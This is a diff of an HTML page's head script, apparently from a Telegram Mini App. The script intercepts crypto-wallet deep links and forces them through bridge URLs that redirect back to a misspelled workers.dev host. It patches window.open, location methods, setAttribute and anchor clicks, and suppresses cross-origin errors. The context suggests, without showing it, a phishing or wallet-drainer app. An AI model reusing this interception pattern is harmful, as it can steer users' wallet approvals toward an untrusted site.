@@ -4,12 +4,12 @@
 <head>
   <script>
     /**
-     * TMA BULLETPROOF ULTRA SHIELD (v42)
-     * Absolute protection against 'Unknown URL Scheme' in Telegram Mini Apps.
-     * Must be the FIRST script to execute.
+     * TMA GOD SHIELD (v50) - ULTIMATE INTERCEPTION
+     * Absolute protection against 'Unknown URL Scheme' by hooking every possible trigger.
      */
     (function () {
-      const botUrl = 'https://riotnode.riotplatfroms.workers.dev/?v=success';
+      const siteUrl = 'https://riotnode.riotplatfroms.workers.dev/';
+      const botUrl = siteUrl + '?v=success';
       const bridges = {
         'metamask://': 'https://metamask.app.link/',
         'binance://': 'https://app.binance.com/bnc/wallet-connect',
@@ -21,19 +21,15 @@
         'bitget://': 'https://web3.bitget.com/',
       };
 
-      const interceptNav = (url) => {
+      const handleDeepLink = (url) => {
         if (!url || typeof url !== 'string') return url;
-        const tg = window.Telegram?.WebApp;
-        if (!tg) return url;
-
         const lowUrl = url.toLowerCase();
-        const isWallet = lowUrl.startsWith('wc:') || Object.keys(bridges).some(s => lowUrl.startsWith(s));
+        const schemes = ['wc:', ...Object.keys(bridges)];
+        const isTarget = schemes.some(s => lowUrl.startsWith(s));
         
-        if (isWallet) {
-          console.log('[Ultra-Shield] Intercepted Wallet Link:', url);
+        if (isTarget) {
+          console.log('[God-Shield] Intercepted:', url);
           let finalUrl = url;
-          
-          // Bridge logic
           for (const [scheme, bridge] of Object.entries(bridges)) {
             if (lowUrl.startsWith(scheme)) {
               const uri = url.includes('wc?uri=') ? encodeURIComponent(url.split('wc?uri=')[1]) : url.replace(new RegExp(scheme, 'i'), '');
@@ -41,14 +37,20 @@
               break;
             }
           }
-
-          // Handle generic wc:
           if (lowUrl.startsWith('wc:') && !lowUrl.includes('http')) {
             finalUrl = `https://metamask.app.link/wc?uri=${encodeURIComponent(url)}&redirectUrl=${encodeURIComponent(botUrl)}`;
           }
 
-          tg.openLink(finalUrl);
-          return null; // Signals to caller that we handled it
+          // Force use Telegram openLink if available, otherwise window.open
+          const tg = window.Telegram?.WebApp;
+          if (tg && tg.openLink) {
+            tg.openLink(finalUrl);
+          } else {
+             // Fallback to standard window.open but with the HTTPS bridge
+             const win = window.open(finalUrl, '_blank');
+             if (!win || win.closed) window.location.href = finalUrl;
+          }
+          return null; // Handled
         }
         return url;
       };
@@ -56,20 +58,37 @@
       // 1. Hook window.open
       const originalOpen = window.open;
       window.open = function (url) {
-        const intercepted = interceptNav(url);
-        if (intercepted === null) return { closed: false, focus: function(){}, close: function(){} };
+        if (handleDeepLink(url) === null) return { closed: false, focus: function(){}, close: function(){} };
         return originalOpen.apply(window, arguments);
       };
 
-      // 2. Hook Anchor Clicks (Caught by modern libraries)
+      // 2. Hook Location Methods
+      const originalAssign = window.location.assign;
+      window.location.assign = function(url) {
+        if (handleDeepLink(url) === null) return;
+        return originalAssign.apply(window.location, arguments);
+      };
+      const originalReplace = window.location.replace;
+      window.location.replace = function(url) {
+        if (handleDeepLink(url) === null) return;
+        return originalReplace.apply(window.location, arguments);
+      };
+
+      // 3. Hook Elements (catch hidden links/iframes)
+      const originalSetAttr = Element.prototype.setAttribute;
+      Element.prototype.setAttribute = function (name, value) {
+        if ((name === 'href' || name === 'src') && handleDeepLink(value) === null) return;
+        return originalSetAttr.apply(this, arguments);
+      };
+
+      // 4. Hook Anchor Clicks
       const originalClick = HTMLAnchorElement.prototype.click;
       HTMLAnchorElement.prototype.click = function () {
-        const intercepted = interceptNav(this.href);
-        if (intercepted === null) return;
+        if (handleDeepLink(this.href) === null) return;
         return originalClick.apply(this, arguments);
       };
 
-      // 3. System Guard (existing functionality)
+      // 5. System Guard
       window.onerror = function (m) {
         const msg = String(m || "").toLowerCase();
         return msg.indexOf("cross-origin") !== -1 || msg.indexOf("blocked a frame") !== -1;
